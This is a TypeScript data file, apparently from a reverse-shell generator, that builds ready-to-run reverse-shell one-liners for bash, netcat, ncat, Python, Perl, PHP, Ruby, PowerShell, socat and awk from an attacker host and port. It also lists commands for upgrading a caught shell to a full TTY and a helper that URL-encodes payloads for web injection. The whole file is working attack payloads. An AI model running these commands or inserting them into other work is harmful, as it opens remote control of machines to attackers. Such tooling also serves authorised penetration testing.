export interface ShellVariant {
  id: string;
  name: string;
  build: (lhost: string, lport: string) => string;
}

export interface TtyUpgrade {
  id: string;
  name: string;
  command: string;
}

export const SHELL_VARIANTS: ShellVariant[] = [
  {
    id: 'bash-tcp',
    name: 'Bash -i',
    build: (lhost, lport) => `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`,
  },
  {
    id: 'bash-readline',
    name: 'Bash 196',
    build: (lhost, lport) =>
      `0<&196;exec 196<>/dev/tcp/${lhost}/${lport}; sh <&196 >&196 2>&196`,
  },
  {
    id: 'nc-mkfifo',
    name: 'netcat (mkfifo)',
    build: (lhost, lport) =>
      `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${lhost} ${lport} >/tmp/f`,
  },
  {
    id: 'nc-e',
    name: 'netcat -e',
    build: (lhost, lport) => `nc -e /bin/sh ${lhost} ${lport}`,
  },
  {
    id: 'ncat-e',
    name: 'ncat -e',
    build: (lhost, lport) => `ncat ${lhost} ${lport} -e /bin/sh`,
  },
  {
    id: 'python3',
    name: 'Python3',
    build: (lhost, lport) =>
      `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'`,
  },
  {
    id: 'perl',
    name: 'Perl',
    build: (lhost, lport) =>
      `perl -e 'use Socket;$i="${lhost}";$p=${lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
  },
  {
    id: 'php',
    name: 'PHP',
    build: (lhost, lport) =>
      `php -r '$sock=fsockopen("${lhost}",${lport});exec("/bin/sh -i <&3 >&3 2>&3");'`,
  },
  {
    id: 'ruby',
    name: 'Ruby',
    build: (lhost, lport) =>
      `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${lhost}","${lport}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`,
  },
  {
    id: 'powershell',
    name: 'PowerShell',
    build: (lhost, lport) =>
      `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${lhost}",${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}`,
  },
  {
    id: 'socat',
    name: 'socat',
    build: (lhost, lport) => `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${lhost}:${lport}`,
  },
  {
    id: 'awk',
    name: 'awk',
    build: (lhost, lport) =>
      `awk 'BEGIN{s="/inet/tcp/0/${lhost}/${lport}";for(;s|&getline c;close(c))while((c|getline)>0)print|&s}' /dev/null`,
  },
];

export const TTY_UPGRADES: TtyUpgrade[] = [
  {
    id: 'python-pty',
    name: 'Python pty spawn',
    command: `python3 -c 'import pty; pty.spawn("/bin/bash")'`,
  },
  {
    id: 'stty-raw',
    name: 'Full TTY (stty raw)',
    command: `# in reverse shell:\nexport TERM=xterm\n# background it with Ctrl+Z, then on your listener host:\nstty raw -echo; fg\n# then in the shell:\nreset; export SHELL=bash; export TERM=xterm-256color; stty rows <ROWS> columns <COLS>`,
  },
  {
    id: 'script',
    name: 'script (no python)',
    command: `/usr/bin/script -qc /bin/bash /dev/null`,
  },
  {
    id: 'socat-full-tty',
    name: 'socat full TTY listener',
    command: `socat file:\`tty\`,raw,echo=0 tcp-listen:4444`,
  },
];

export function urlEncodeIfNeeded(command: string, urlEncode: boolean): string {
  return urlEncode ? encodeURIComponent(command) : command;
}
